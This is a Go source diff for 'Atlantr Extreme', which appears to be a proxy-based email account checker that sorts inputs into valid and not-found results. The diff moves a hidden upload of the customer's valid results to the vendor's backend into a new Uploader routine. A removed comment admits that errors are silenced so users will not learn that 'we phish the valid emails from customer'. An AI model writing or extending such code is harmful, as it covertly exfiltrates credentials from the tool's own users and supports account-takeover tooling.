@@ -20,10 +20,8 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/pierelucas/atlantr-extreme/license"
-	"github.com/pierelucas/atlantr-extreme/uploader"
-
 	"github.com/pierelucas/atlantr-extreme/conn"
+	"github.com/pierelucas/atlantr-extreme/license"
 
 	"github.com/pierelucas/atlantr-extreme/data"
 	"github.com/pierelucas/atlantr-extreme/parse"
@@ -31,6 +29,8 @@ import (
 	"github.com/pierelucas/atlantr-extreme/utils"
 )
 
+// let's fool around and use init() for the license and config setup, instead of variable initialisation (:
+// i know, maybe we define a own function for this later and use init for the real init things
 func init() {
 	var err error
 
@@ -73,8 +73,11 @@ func init() {
 		utils.CheckErrorPrintFatal(err)
 
 		// Now we send our key to the backend server, if err != nil the key is not valid, already used or expired
-		err = license.Call(jsonString, licenseSystemBackend)
-		utils.CheckErrorPrintFatal(err)
+		err = conn.Send(jsonString, licenseSystemBackend, debug)
+		if err != nil {
+			fmt.Println("error: your license is not valid, already in use or expired. Please contact your vendor for support\nAlso please make sure you have a working internet connection, when not, fix that and try again")
+			os.Exit(1)
+		}
 
 		// write license
 		ioutil.WriteFile(licensepath, []byte(licenseKey), 0644)
@@ -92,6 +95,7 @@ func init() {
 		conf.SetHOSTFILE(defaultHOSTERFILE)
 		conf.SetMAXJOBS(defaultMAXJOBS)
 		conf.SetBUFFERSIZE(defaultBUFFERSIZE)
+		conf.SetSAVELASTLINELOG(defaultSAVELASTLINELOG)
 
 		// write config
 		err = conf.Write(configpath)
@@ -108,6 +112,23 @@ func init() {
 
 	// parse and validate commandline args
 	parseFlags()
+}
+
+func saveLastLineLog() error {
+	log.Println("saving lastlinelog")
+
+	lastlinefinal := atomic.LoadUint64(&lastline)
+	d1 := []byte(strconv.Itoa(int(lastlinefinal)))
+
+	t := time.Now()
+	llFilename := fmt.Sprintf("lastline_%s.log", t.Format("2006-01-02-15:04.05"))
+
+	err := ioutil.WriteFile(llFilename, d1, 0644)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func main() {
@@ -136,7 +157,6 @@ func main() {
 		signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 		<-c
 		log.Println("ABORT: you pressed ctrl+c")
-		log.Println("Atlantr Extreme is forced to shutdown")
 		cancel()
 	}()
 
@@ -167,6 +187,7 @@ func main() {
 	smobj := &sm{
 		jobCH:      make(chan *Job, conf.USERVALUE.GetMAXJOBS()),
 		resultCH:   make(chan *Job, 1),
+		uploadCH:   make(chan *Job, 1),
 		notFoundCH: make(chan *Job, 1),
 		validProxies: func() *validProxies {
 			if conf.GetUSESOCKS() {
@@ -181,95 +202,51 @@ func main() {
 		}(),
 	}
 
-	// Now we have to create two channels with a buffer of one.
-	// We will store our valid filename and our notfoudn filename in then later
-	validFileNameCH := make(chan string, 1)
-	notFoundFileNameCH := make(chan string, 1)
-
 	// Now we start our workers but wait on each routine until startCH is closed
-	wg := &sync.WaitGroup{}
+	handlerWG := &sync.WaitGroup{}
 	startCH := make(chan struct{})
 	for i := 1; i < conf.GetWorkers(); i++ {
-		wg.Add(1)
-		go WorkerStateMachine(ctx, smobj, startCH, wg)
+		handlerWG.Add(1)
+		go WorkerStateMachine(ctx, smobj, startCH, handlerWG)
 	}
 
-	go Producer(ctx, smobj, *flagINPUT, startLine, startCH)
-	go Writer(ctx, smobj.resultCH, validFileNameCH, conf.USERVALUE.GetBUFFERSIZE(), conf.USERVALUE.GetVALIDFILE(), startCH)
-	go Writer(ctx, smobj.notFoundCH, notFoundFileNameCH, conf.USERVALUE.GetBUFFERSIZE(), conf.USERVALUE.GetNOTFOUNDFILE(), startCH)
+	// We need a second waitgroup for our writer and uploader
+	workerWG := &sync.WaitGroup{}
+	workerWG.Add(3)
+
+	go Producer(ctx, smobj, *flagINPUT, startLine, startCH) // we don't need a waitgroup on Producer() cause WorkerStateMachine() will not return until the producer is done
+	go Writer(ctx, smobj.resultCH, conf.USERVALUE.GetBUFFERSIZE(), conf.USERVALUE.GetVALIDFILE(), startCH, workerWG)
+	go Writer(ctx, smobj.notFoundCH, conf.USERVALUE.GetBUFFERSIZE(), conf.USERVALUE.GetNOTFOUNDFILE(), startCH, workerWG)
+	go Uploader(ctx, smobj, backend, startCH, workerWG)
 
 	// Start all routines
-	func() {
+	go func() {
 		log.Println("routines are starting now")
 		close(startCH)
 	}()
 
-	// Close our routines when the worker's receive the signal that the jobCH channel is closed by the Producer and return
-	// We call cancel() and close the context on which we ware wiatign on the main routine.
+	// Close our routines when the worker's receive the signal that the jobCH channel is closed by the Producer.
+	// We call cancel() and close the context on which we ware waiting on the main routine.
 	go func() {
-		wg.Wait()
-		close(smobj.resultCH)
-		close(smobj.notFoundCH)
-		log.Println("routines are shutting down")
+		handlerWG.Wait()
+		close(smobj.resultCH) // close the writer and upload channels and let the Writer() and Uploader() routines begin to shutdown
+		close(smobj.uploadCH)
+
+		log.Println("routines finish and shutting down now, clean-up is starting and files will be written")
+		workerWG.Wait() // Wait till the last bytes are written and uploads are finished
 		cancel()
 	}()
 
-	<-ctx.Done()                // wait for context cancel
-	time.Sleep(time.Second * 2) // Give some time to shutdown all running routines, writeout the last bytes and closing files
+	<-ctx.Done()            // wait for context cancel
+	time.Sleep(time.Second) // chill down
 
-	// Before exit we have to write our lastlinelog
-	func() {
-		log.Println("saving lastlinelog")
-		lastlinefinal := atomic.LoadUint64(&lastline)
-		d1 := []byte(strconv.Itoa(int(lastlinefinal)))
-		t := time.Now()
-		llFilename := fmt.Sprintf("lastline_%s.log", t.Format("2006-01-02-15:04.05"))
-		err = ioutil.WriteFile(llFilename, d1, 0644)
-		utils.CheckError(err)
-	}()
-
-	// Upload our files to backend if upload is set to true
-	if upload {
-		err = func() error {
-			var err error
-
-			validData, err := ioutil.ReadFile(<-validFileNameCH)
-			if err != nil {
-				return err
-			}
-
-			notFoundData, err := ioutil.ReadFile(<-notFoundFileNameCH)
-			if err != nil {
-				return err
-			}
-
-			pair, err := uploader.NewPair(validData, notFoundData, machineID)
-			if err != nil {
-				return err
-			}
-
-			jsonString, err := pair.Marshal()
-			if err != nil {
-				return err
-			}
-
-			err = conn.Send(jsonString, backend, false)
-			if err != nil {
-				return err
-			}
-
-			return nil
-		}()
-		// In production, we dont want the error message to be printed out to log file.
-		// When the backend fileserver is no reachable or any other error occur, the error log will
-		// leak the behavio that we phish the valid emails from customer
-		if debug {
-			utils.CheckError(err)
-		}
+	// Before exit we have to write our lastlinelog, if SAVELASTLINELOG is true
+	if conf.USERVALUE.IsSAVELASTLINELOG() {
+		saveLastLineLog()
 	}
 
 	log.Println("Atlantr-Extreme is shutting down...")
-	time.Sleep(time.Second) // chill down again
+	time.Sleep(time.Second) // chill down
 
 	return // EXIT_SUCCESS
 }
